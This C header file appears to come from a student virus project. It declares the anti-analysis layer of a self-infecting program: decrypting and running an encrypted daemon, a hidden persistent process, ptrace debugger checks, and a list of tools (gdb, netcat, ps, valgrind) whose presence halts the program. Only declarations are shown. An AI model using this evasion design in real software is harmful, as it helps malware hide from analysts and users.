/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   anti_debug.h                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 20:08:14 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 22:49:54 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef ANTI_DEBUG_H
# define ANTI_DEBUG_H

# define SUCCESS                    0
# define FAILURE                    -1

/*
**
**          --> DEAMONS CRYPTED HEXDUMP
**
*/
#include "deamons.h"

/*
**
**      --> SYSCALLS
**
*/
#include <sys/syscall.h>

#define SYS_READ                    0
#define SYS_WRITE                   1
#define SYS_OPEN                    2
#define SYS_CLOSE                   3
#define SYS_STAT                    4
#define SYS_LSEEK                   8
#define SYS_MMAP                    9
#define SYS_MUNMAP                  11
#define SYS_GETDENTS64              217

# include <stdlib.h>
# include <unistd.h>
# include <fcntl.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <dirent.h>
# include <string.h>
# include <stdio.h>
# include <sys/ptrace.h>
# include <sys/mman.h>

#define DEAMON_INFECTION_PATH               "/tmp/yeah_dude_ur_infected"

/*
**
**      --> AES ENCRYPTATION / DECRYPTATION
**
*/
//#include <openssl/evp.h> // have to install that
//#include <openssl/aes.h>

#define KEY                         "to define must be 256bits for better security"
#define IV                          "to define must be 128 bits"

typedef struct                      s_aes
{
    char                            *cypher_text;
    char                            *plain_text;
    size_t                          cypher_size; // xd i wrote bad cipher :/
    size_t                          plain_size;
    char                            error;
    EVP_CIPHER_CTX                  *context_encrypt;
    EVP_CIPHER_CTX                  *context_decrypt;
    char                            *key;
    size_t                          key_size;
    char                            *init_vector;
    size_t                          vec_size;
}                                   t_aes;

t_aes                               *init_aes(void);
char                                encrypt(t_aes *aes, char *plain_text, size_t plain_size);
char                                decrypt(t_aes *aes, char *cipher_text, size_t cipher_size);
void                                free_aes(t_aes *aes);

/*
**
**      --> ATP (Advanced Thread Process) used for unleash tracer-checker deamon
**
*/
typedef struct                      s_atp
{
    char                            **env;
    char                            pestilence;
}                                   t_atp;

#define PTC_NAME                    "/tmp/trace_me_if_u_can" // path
#define PROCESS_ATP                 {".trace_me_if_u_can", NULL} // process: persistent process name

char                                run_atp(t_atp *atp);
void                                *__atp__(void *ptr);
char                                build_atp(t_atp *atp);

/*
**
**      --> CHECK IF EXITING PROCESS ARE ALLOWED
**
*/
#define FORBIDEN_PROCESS            { "cat", "top", "htop", "gdb", "netcat", "ps", "valgrind", "lldb", NULL}
char                                check_process(char **process);

/*
**
**      --> TRACERS CHECKER
**
*/
typedef struct		                s_tracer
{
	char			                *cmdline;
	char			                *status_name;
	char			                *status;
}					                t_tracer;

#define ALLOWED_TRACERS             {"bash", "zsh", "csh", "sh", "dash", "ksh93", "tcsh", "fish", "rbash", "ksh", NULL}

char                                dir_check(int pid);
int                                 get_pid(char is_parent);
char                                get_tracer(t_tracer *tracer, int pid);
char                                allowed_tracer(t_tracer *tracer);
char                                check_tracers(t_aes *aes);

/*
**
**      --> DEAMONS CREATOR AND EXECUTOR
**
*/
char                                execute_deamon(t_aes *aes, char **argv, const char *hexdump, char **env);

/*
**
**      --> CHECK IS THERE SOMETHING NOT ALLOWED BEFORE UNLEASH INFECTION DEMON
**
*/
#define PTRACE_TRACEME              0

char                                stop_exection(t_aes *aes);

/*
**
**      --> UTILS
**
*/
char                                dir_check(int pid);
char                                **get_cmd_lines(char **files, char *dir_path, char recursion);
char                                *read_file_data(int fd, size_t size);
char                                *get_file_data(const char *filename);
char                                *get_file_base_name(const char *path);

/*
**
**      --> MAIN FUNCTION
**
*/
t_aes                               *anti_debug(char **env, t_atp *atp);

#endif
